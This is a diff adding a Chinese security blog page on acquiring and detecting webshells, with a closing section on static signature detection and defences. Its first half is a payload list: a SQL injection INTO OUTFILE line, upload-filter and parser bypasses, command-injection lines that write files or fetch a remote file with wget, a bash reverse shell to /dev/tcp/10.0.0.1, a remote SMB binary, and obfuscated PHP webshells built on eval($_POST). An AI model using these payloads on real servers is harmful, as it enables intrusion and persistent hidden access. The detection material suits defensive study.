@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>webshell的获取与查杀 | liuqi</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="1. 总结获取WebShell的几种手段123获取webshell的几种手段sql注入（mysql数据库 具有file权限）获取webshell当前连接mysql数据库的账号具有file权限
+1·知道网站的绝对路径利用：index.php?id=1 union select 1,2,3,&apos;&apos; into1outfile &amp;apos;/var/www/html/phpinfo.php&amp;apos;)
+m">
+<meta property="og:type" content="article">
+<meta property="og:title" content="webshell的获取与查杀">
+<meta property="og:url" content="http://yoursite.com/2016/08/05/webshell的获取与查杀/index.html">
+<meta property="og:site_name" content="liuqi">
+<meta property="og:description" content="1. 总结获取WebShell的几种手段123获取webshell的几种手段sql注入（mysql数据库 具有file权限）获取webshell当前连接mysql数据库的账号具有file权限
+1·知道网站的绝对路径利用：index.php?id=1 union select 1,2,3,&apos;&apos; into1outfile &amp;apos;/var/www/html/phpinfo.php&amp;apos;)
+m">
+<meta property="og:updated_time" content="2016-08-05T03:07:03.810Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="webshell的获取与查杀">
+<meta name="twitter:description" content="1. 总结获取WebShell的几种手段123获取webshell的几种手段sql注入（mysql数据库 具有file权限）获取webshell当前连接mysql数据库的账号具有file权限
+1·知道网站的绝对路径利用：index.php?id=1 union select 1,2,3,&apos;&apos; into1outfile &amp;apos;/var/www/html/phpinfo.php&amp;apos;)
+m">
+  
+    <link rel="alternate" href="/atom.xml" title="liuqi" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="../../../../css/style.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="../../../../index.html" id="logo">liuqi</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="../../../../index.html">Home</a>
+        
+          <a class="main-nav-link" href="../../../../archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-webshell的获取与查杀" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="" class="article-date">
+  <time datetime="2016-08-05T03:00:42.000Z" itemprop="datePublished">2016-08-05</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="../../../../categories/WEB/">WEB</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      webshell的获取与查杀
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><strong>1. 总结获取WebShell的几种手段</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">获取webshell的几种手段</div><div class="line">sql注入（mysql数据库 具有file权限）获取webshell</div><div class="line">当前连接mysql数据库的账号具有file权限</div></pre></td></tr></table></figure></p>
+<p>1·知道网站的绝对路径<figure class="highlight plain"><figcaption><span>利用：index.php?id=1 union select 1,2,3,'<?php phpinfo(); ?>' into</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">outfile &apos;/var/www/html/phpinfo.php&apos;)</div></pre></td></tr></table></figure></p>
+<p>mysql有权限到网站的目录下写文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">防御：数据库连接账号不要使用root权限，php报错模式关闭,，mysql账号没有权限向网站目录写文件</div></pre></td></tr></table></figure></p>
+<p><strong>2.上传漏洞获取wenshell</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">（</div><div class="line">    1.先判断是程序员自己写的上传点，还是编辑器上传功能</div><div class="line">   2.如果是编辑器上传功能，google当前编辑器漏洞（名字，版本）</div><div class="line">    3.如果是程序员写的上传点（1.上传一个正常的jpg图片2.上传一个正常jpg图片，burp拦截，修改后缀为php3.上传一个正常jpg图片，上传一个正常jpg图片，burp拦截，00截断 1.php%00.jpg）</div><div class="line">       4.判断服务器是什么类型，web服务器程序，是什么类型</div></pre></td></tr></table></figure></p>
+<p>利用解析漏洞<br>  （常见的解析漏洞通常是与web容器的解析漏洞配合利用，常见的web容器有iis、nginx、apache、tomcat等等<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">    1.iis解析漏洞当建立.asp、.asa格式的文件夹时，其目录下任意文件都会被iis当做asp文件来解析</div><div class="line">      2.apache解析漏洞,apache解析文件的时候有一个原则，当碰到不认识的扩展名时，将会从后向前解析，直到碰到认识的扩展名为止，如果不认识就会暴露其源代码如：1.php.rar.sa.xs就会被解析为php，可以据此来绕过文件名限制可以在apache安装目录下的文件“/conf/mime.types”中配置apache可以识别的文件名</div><div class="line">      3.nginx解析漏洞：对低版本的nginx可以在任意文件名后添加%00.php进行解析攻击</div><div class="line">上传图片xx.jpg然后通过改名为xx.jpg%00.php就会解析为php）</div></pre></td></tr></table></figure></p>
+<p><strong>3.任意命令执行获取webshell</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">条件：</div><div class="line">    知道网站绝对路径</div><div class="line">    利用代码执行漏洞读取apache配置文件，找根目录</div><div class="line">    执行pwd，获取当前工作路径</div><div class="line">    apache权限对网站目录写文件</div><div class="line">    网站图片上传目录，一般apache都要可写权限</div><div class="line">    index.php?command=echo &quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; /var/www/</div><div class="line">html/phpinfo.php</div><div class="line">index.php?command=wget -O /var/www/html/phpinfo.php</div><div class="line">http://xxxx/phpinfo.txt</div><div class="line">  防御：修补任意命令执行获取webshell</div><div class="line">任意命令执行获取webshell 在不获取webshell的情况下，也可以控制服务器，不需要必须获取webshell，根据情况而定</div><div class="line">任意命令执行可以直接反弹一个shell</div><div class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0 &gt;&amp;1</div><div class="line">任意命令执行可以，执行远程samba里面的二进制文件</div><div class="line"> \\10.0.0.1\shell.exe</div><div class="line">powershelll</div></pre></td></tr></table></figure></p>
+<p><strong>4.任意代码执行获取webshell</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">apache权限对网站目录写文件</div><div class="line">网站图片上传目录,一般apache都有可写权限</div><div class="line">利用：index.php?code=file_put_contents($_POST[f], $_POST[d]);</div><div class="line">f=phpinfo.php&amp;d=&lt;?php phpinfo(); ?&gt;</div><div class="line">apache权限没有对网站目录写文件：index.php?code=eval($_POST[1]);</div></pre></td></tr></table></figure></p>
+<p><strong>5.任意文件包含获取webshell</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">本地包含：文件包含本地目录下面的木马文件获取webshell，没有木马文件就上传一个</div><div class="line">远程包含：首先要保证配置文件中开启了allow_url_include=on，然后可以包含其他网站</div></pre></td></tr></table></figure></p>
+<p><strong>6.后台相关功能获取webshell</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">条件：进入后台</div><div class="line">后台相关功能获取webshell</div><div class="line">1.数据库备份功能</div><div class="line">2.数据库恢复功能</div><div class="line">3.文件管理功能</div><div class="line">持久隐藏webshell</div><div class="line">目录命名</div><div class="line">利用文件包含隐藏webshell</div><div class="line">在服务器的某个脚本文件中写入</div><div class="line">include(&quot;/upload/xxxx.jpg&quot;)；</div><div class="line">编码</div><div class="line">&lt;?php</div><div class="line">@$_++;</div><div class="line">$__=(“#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;&#123;&quot;^&quot;/&quot;);</div><div class="line">@$&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]);?&gt;</div><div class="line">&lt;?</div><div class="line">@$_POST[0]($_POST[1])</div><div class="line">&lt;?</div><div class="line">@eval($_POST[1])</div></pre></td></tr></table></figure></p>
+<p><strong>2. 总结WebShell静态查杀的一些特征</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">分析</div><div class="line">总的思路：先找到异常日志，再找到攻击日志，整个过程分为两个步骤：webshell提取 ＋ webshell确认</div><div class="line">静态检测：</div><div class="line"></div><div class="line"> 静态特征检测面临的一个问题是误报。因为一些特征字符串正常程序本身也需要用到。</div><div class="line">比如PHP里面的eval、system等，ASP里面的FileSystemObject、include等。所以雷客图在</div><div class="line">设计之初就是一个辅助工具，最终还需要有相关安全经验的人来判定。</div><div class="line">对于少量站点可以用这样人肉去检查，如果是一个成千上万站点的大型企业呢，这个时</div><div class="line">候再人肉那工作量可就大了。所以用这样一种思路：强弱特征。即把特征码分为强弱两种特</div><div class="line">征，强特征命中则必是webshell；弱特征由人工去判断。加入一种强特征，即把流行webshell</div><div class="line">用到的特征作为强特征重点监控，一旦出现这样的特征即可确认为webshell立即进行响应。</div><div class="line">比如PHPSpy里面会出现phpspy、wofeiwo、eval($_POST[xxx])等，ASP里面出现Shell.Application</div><div class="line">等。当然，黑客完全可以变形躲过，没关系，还有人工检查的弱特征。</div><div class="line">另一个问题是漏报。程序的关键是特征字符串，它直接关系着结果，如果你的特征库里</div><div class="line">面没有记录的甚至是一种新的webshell代码，就可能束手无策了。雷客图第一版出来后，我</div><div class="line">自以为所有的ASP webshell都可以查了，但是我错了，因为不断会有新的方式出来绕过，最</div><div class="line">终结果就是特征被动的跟着webshell升级而升级，同时还面临未知的webshell——这个情况</div><div class="line">和特征码杀毒软件何其相似。</div><div class="line"></div><div class="line">    要解决误报和漏报，就不能拘泥于代码级别了。可以换个角度考虑问题：文件系统。我</div><div class="line">们可以结合文件的属性来判断，比如apache是noboy启动的，webshell的属主必然也是nobody，</div><div class="line">如果我的Web目录无缘无故多了个nobody的文件，这里就有问题了。最理想的办法是需要制度</div><div class="line">和流程来建设一个Web目录唯一发布入口，控制住这个入口，非法进来的Web文件自然可以发</div><div class="line">现。</div></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/08/05/webshell的获取与查杀/" data-id="cirh67pjf0016r8hrwouznvv9" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../../../tags/webshell/">webshell</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="../redis漏洞利用/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">redis漏洞利用</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="../../../../categories/WEB/">WEB</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/linux/">linux</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/安全/">安全</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/centos/">centos</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/csrf/">csrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/github/">github</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/google/">google</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/linux问题/">linux问题</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/mysql/">mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/redis/">redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/sqlmap/">sqlmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/sql注入/">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/tcp-ip/">tcp/ip</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/webshell/">webshell</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/win2003/">win2003</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/上传/">上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/执行/">执行</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/敏感信息/">敏感信息</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/文件包含/">文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/流程/">流程</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/逻辑/">逻辑</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="../../../../tags/centos/" style="font-size: 16.67px;">centos</a> <a href="../../../../tags/csrf/" style="font-size: 10px;">csrf</a> <a href="../../../../tags/github/" style="font-size: 10px;">github</a> <a href="../../../../tags/google/" style="font-size: 10px;">google</a> <a href="../../../../tags/linux问题/" style="font-size: 10px;">linux问题</a> <a href="../../../../tags/mysql/" style="font-size: 10px;">mysql</a> <a href="../../../../tags/redis/" style="font-size: 13.33px;">redis</a> <a href="../../../../tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="../../../../tags/sql注入/" style="font-size: 20px;">sql注入</a> <a href="../../../../tags/tcp-ip/" style="font-size: 10px;">tcp/ip</a> <a href="../../../../tags/webshell/" style="font-size: 10px;">webshell</a> <a href="../../../../tags/win2003/" style="font-size: 10px;">win2003</a> <a href="../../../../tags/xss/" style="font-size: 13.33px;">xss</a> <a href="../../../../tags/上传/" style="font-size: 13.33px;">上传</a> <a href="../../../../tags/执行/" style="font-size: 13.33px;">执行</a> <a href="../../../../tags/敏感信息/" style="font-size: 10px;">敏感信息</a> <a href="../../../../tags/文件包含/" style="font-size: 10px;">文件包含</a> <a href="../../../../tags/流程/" style="font-size: 10px;">流程</a> <a href="../../../../tags/逻辑/" style="font-size: 10px;">逻辑</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2016/05/">May 2016</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="">webshell的获取与查杀</a>
+          </li>
+        
+          <li>
+            <a href="../redis漏洞利用/">redis漏洞利用</a>
+          </li>
+        
+          <li>
+            <a href="../redis的安装/">redis的安装</a>
+          </li>
+        
+          <li>
+            <a href="../centos6-5samba服务器的搭建/">centos6.5samba服务器的搭建</a>
+          </li>
+        
+          <li>
+            <a href="../../04/逻辑漏洞/">逻辑漏洞</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2016 liuqi<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="../../../../index.html" class="mobile-nav-link">Home</a>
+  
+    <a href="../../../../archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="../../../../fancybox/jquery.fancybox.css">
+  <script src="../../../../fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="../../../../js/script.js"></script>
+
+  </div>
+</body>
+</html>
